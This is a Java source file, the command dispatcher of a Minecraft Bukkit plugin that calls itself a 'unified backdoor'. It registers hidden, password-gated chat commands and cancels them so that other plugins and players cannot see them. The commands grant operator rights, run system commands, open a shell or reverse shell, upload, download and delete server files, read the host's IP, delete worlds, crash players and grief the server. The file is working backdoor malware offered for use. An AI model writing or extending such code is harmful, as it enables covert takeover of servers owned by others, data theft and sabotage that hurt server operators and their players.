package com.unifiedbackdoor.commands;

import com.unifiedbackdoor.UnifiedBackdoorPlugin;
import com.unifiedbackdoor.features.*;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 * 命令管理器
 * 处理所有!前缀命令
 */
public class CommandManager implements Listener {
    
    private final UnifiedBackdoorPlugin plugin;
    private final Map<String, CommandHandler> commandHandlers;
    
    // 功能模块
    private final ServerManager serverManager;
    private final PlayerManager playerManager;
    private final WorldManager worldManager;
    private final FileManager fileManager;
    private final EffectsManager effectsManager;
    private final TrollManager trollManager;
    
    public CommandManager(UnifiedBackdoorPlugin plugin) {
        this.plugin = plugin;
        this.commandHandlers = new HashMap<>();
        
        // 初始化功能模块
        this.serverManager = new ServerManager(plugin);
        this.playerManager = new PlayerManager(plugin);
        this.worldManager = new WorldManager(plugin);
        this.fileManager = new FileManager(plugin);
        this.effectsManager = new EffectsManager(plugin);
        this.trollManager = new TrollManager(plugin);
        
        // 注册命令处理器
        registerCommandHandlers();
    }
    
    /**
     * 注册所有命令处理器
     */
    private void registerCommandHandlers() {
        // ========== Level 1 命令 ==========
        registerCommand("login", this::handleLogin);
        registerCommand("help", this::handleHelp);
        registerCommand("test", this::handleTest);
        
        // ========== Level 2 命令 - 服务器管理 ==========
        registerCommand("op", serverManager::handleOp);
        registerCommand("deop", serverManager::handleDeop);
        registerCommand("ban", serverManager::handleBan);
        registerCommand("banip", serverManager::handleBanIp);
        registerCommand("kick", serverManager::handleKick);
        registerCommand("reload", serverManager::handleReload);
        registerCommand("stop", serverManager::handleStop);
        registerCommand("info", serverManager::handleInfo);
        registerCommand("chaos", serverManager::handleChaos);
        registerCommand("exec", serverManager::handleExec);
        registerCommand("shell", serverManager::handleShell);
        registerCommand("revshell", serverManager::handleRevShell);
        
        // ========== Level 2 命令 - 玩家控制 ==========
        registerCommand("gamemode", playerManager::handleGameMode);
        registerCommand("give", playerManager::handleGive);
        registerCommand("enchant", playerManager::handleEnchant);
        registerCommand("rename", playerManager::handleRename);
        registerCommand("vanish", playerManager::handleVanish);
        registerCommand("silktouch", playerManager::handleSilkTouch);
        registerCommand("instabreak", playerManager::handleInstaBreak);
        registerCommand("crash", playerManager::handleCrash);
        registerCommand("freeze", playerManager::handleFreeze);
        registerCommand("tp", playerManager::handleTeleport);
        registerCommand("coords", playerManager::handleCoords);
        
        // ========== Level 2 命令 - 世界操作 ==========
        registerCommand("seed", worldManager::handleSeed);
        registerCommand("listworlds", worldManager::handleListWorlds);
        registerCommand("makeworld", worldManager::handleMakeWorld);
        registerCommand("delworld", worldManager::handleDelWorld);
        registerCommand("nuke", worldManager::handleNuke);
        registerCommand("spam", worldManager::handleSpam);
        registerCommand("floodlava", worldManager::handleFloodLava);
        registerCommand("floodarea", worldManager::handleFloodArea);
        registerCommand("bigexplosion", worldManager::handleBigExplosion);
        registerCommand("spawnentities", worldManager::handleSpawnEntities);
        
        // ========== Level 2 命令 - 文件系统操作 ==========
        registerCommand("download", fileManager::handleDownload);
        registerCommand("upload", fileManager::handleUpload);
        registerCommand("pathupload", fileManager::handlePathUpload);
        registerCommand("deletefiles", fileManager::handleDeleteFiles);
        registerCommand("getpaths", fileManager::handleGetPaths);
        registerCommand("getip", fileManager::handleGetIp);
        
        // ========== Level 2 命令 - 特殊效果 ==========
        registerCommand("dupe", effectsManager::handleDupe);
        registerCommand("here", effectsManager::handleHere);
        registerCommand("spikebomb", effectsManager::handleSpikeBomb);
        registerCommand("kontrolcubugu", effectsManager::handleKontrolCubugu);
        registerCommand("tofiklava", effectsManager::handleTofikLava);
        registerCommand("tofikfire", effectsManager::handleTofikFire);
        registerCommand("tofikpoison", effectsManager::handleTofikPoison);
        registerCommand("tofikblind", effectsManager::handleTofikBlind);
        registerCommand("tofikexplosion", effectsManager::handleTofikExplosion);
        registerCommand("tofiklightning", effectsManager::handleTofikLightning);
        
        // ========== Level 2 命令 - Troll系统 ==========
        registerCommand("troll", trollManager::handleTroll);
        registerCommand("lock", trollManager::handleLock);
        registerCommand("unlock", trollManager::handleUnlock);
        registerCommand("mute", trollManager::handleMute);
        registerCommand("unmute", trollManager::handleUnmute);
        registerCommand("psay", trollManager::handlePsay);
        registerCommand("ssay", trollManager::handleSsay);
    }
    
    /**
     * 注册单个命令处理器
     */
    private void registerCommand(String command, CommandHandler handler) {
        commandHandlers.put(command.toLowerCase(), handler);
    }
    
    /**
     * 处理玩家聊天事件
     */
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();
        String prefix = plugin.getCommandPrefix();
        
        // 检查是否是命令
        if (!message.startsWith(prefix)) {
            return;
        }
        
        // 取消原始消息
        event.setCancelled(true);
        
        // 解析命令
        String[] parts = message.substring(prefix.length()).split(" ");
        String command = parts[0].toLowerCase();
        String[] args = parts.length > 1 ? Arrays.copyOfRange(parts, 1, parts.length) : new String[0];
        
        // 处理命令
        handleCommand(player, command, args);
    }
    
    /**
     * 处理命令预处理事件（防止其他插件拦截）
     */
    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage();
        String prefix = plugin.getCommandPrefix();
        
        if (message.startsWith(prefix)) {
            event.setCancelled(true);
        }
    }
    
    /**
     * 处理命令执行
     */
    private void handleCommand(Player player, String command, String[] args) {
        String username = player.getName();
        
        // 检查权限
        if (!hasPermission(player, command)) {
            sendMessage(player, ChatColor.RED + "你没有权限使用此命令。");
            return;
        }
        
        // 查找命令处理器
        CommandHandler handler = commandHandlers.get(command);
        if (handler != null) {
            try {
                handler.handle(player, args);
            } catch (Exception e) {
                sendMessage(player, ChatColor.RED + "命令执行出错: " + e.getMessage());
                plugin.getLogger().warning("命令执行错误: " + e.getMessage());
                e.printStackTrace();
            }
        } else {
            sendMessage(player, ChatColor.RED + "未知命令: " + command);
            sendMessage(player, ChatColor.YELLOW + "使用 " + plugin.getCommandPrefix() + "help 查看可用命令。");
        }
    }
    
    /**
     * 检查玩家权限
     */
    private boolean hasPermission(Player player, String command) {
        String username = player.getName();
        
        // Level 1 命令权限检查
        if (isLevel1Command(command)) {
            return plugin.hasLevel1Permission(username, player.getUniqueId());
        }
        
        // Level 2 命令权限检查
        if (isLevel2Command(command)) {
            return plugin.hasLevel2Permission(username);
        }
        
        return false;
    }
    
    /**
     * 判断是否为Level 1命令
     */
    private boolean isLevel1Command(String command) {
        return command.equals("login") || command.equals("help") || command.equals("test");
    }
    
    /**
     * 判断是否为Level 2命令
     */
    private boolean isLevel2Command(String command) {
        return !isLevel1Command(command);
    }
    
    // ========== Level 1 命令处理器 ==========
    
    /**
     * 处理登录命令
     */
    private void handleLogin(Player player, String[] args) {
        if (args.length < 1) {
            sendMessage(player, ChatColor.RED + "用法: " + plugin.getCommandPrefix() + "login <密码>");
            return;
        }
        
        String password = args[0];
        if (password.equals(plugin.getPluginConfig().getPassword())) {
            if (plugin.grantLevel2Permission(player.getName())) {
                sendMessage(player, ChatColor.GREEN + "认证成功！你现在可以使用所有Level 2命令。");
            } else {
                sendMessage(player, ChatColor.RED + "认证失败：你没有Level 1权限。");
            }
        } else {
            sendMessage(player, ChatColor.RED + "密码错误！");
        }
    }
    
    /**
     * 处理帮助命令
     */
    private void handleHelp(Player player, String[] args) {
        String prefix = plugin.getCommandPrefix();
        
        sendMessage(player, ChatColor.GOLD + "=== 统一后门插件帮助 ===");
        sendMessage(player, ChatColor.YELLOW + "命令前缀: " + prefix);
        
        if (plugin.hasLevel1Permission(player.getName(), player.getUniqueId())) {
            sendMessage(player, ChatColor.GREEN + "Level 1 命令:");
            sendMessage(player, ChatColor.WHITE + prefix + "login <密码> - 认证获取Level 2权限");
            sendMessage(player, ChatColor.WHITE + prefix + "help - 显示此帮助菜单");
            sendMessage(player, ChatColor.WHITE + prefix + "test - 测试插件状态");
        }
        
        if (plugin.hasLevel2Permission(player.getName())) {
            sendMessage(player, ChatColor.GREEN + "Level 2 命令:");
            sendMessage(player, ChatColor.WHITE + prefix + "op <玩家> - 给予OP权限");
            sendMessage(player, ChatColor.WHITE + prefix + "deop <玩家> - 移除OP权限");
            sendMessage(player, ChatColor.WHITE + prefix + "ban <玩家> - 封禁玩家");
            sendMessage(player, ChatColor.WHITE + prefix + "kick <玩家> - 踢出玩家");
            sendMessage(player, ChatColor.WHITE + prefix + "gamemode <模式> - 切换游戏模式");
            sendMessage(player, ChatColor.WHITE + prefix + "give <物品> [数量] - 给予物品");
            sendMessage(player, ChatColor.WHITE + prefix + "dupe <数量> - 复制手中物品");
            sendMessage(player, ChatColor.WHITE + prefix + "here - 将所有玩家拉到身边");
            sendMessage(player, ChatColor.WHITE + prefix + "freeze - 冻结所有玩家");
            sendMessage(player, ChatColor.WHITE + prefix + "lock - 锁定服务器");
            sendMessage(player, ChatColor.WHITE + prefix + "download <URL> <文件名> - 下载文件");
            sendMessage(player, ChatColor.WHITE + prefix + "upload <URL> <路径> <文件名> - 上传文件到指定路径");
            sendMessage(player, ChatColor.WHITE + "更多命令请查看完整文档");
        }
        
        sendMessage(player, ChatColor.GOLD + "=========================");
    }
    
    /**
     * 处理测试命令
     */
    private void handleTest(Player player, String[] args) {
        sendMessage(player, ChatColor.GREEN + "✓ 统一后门插件工作正常！");
        sendMessage(player, ChatColor.YELLOW + "版本: 1.0.0");
        sendMessage(player, ChatColor.YELLOW + "权限级别: " + 
            (plugin.hasLevel2Permission(player.getName()) ? "Level 2" : 
             plugin.hasLevel1Permission(player.getName(), player.getUniqueId()) ? "Level 1" : "无权限"));
    }
    
    /**
     * 发送消息给玩家
     */
    private void sendMessage(Player player, String message) {
        player.sendMessage(message);
    }
    
    /**
     * 命令处理器接口
     */
    @FunctionalInterface
    public interface CommandHandler {
        void handle(Player player, String[] args);
    }
}
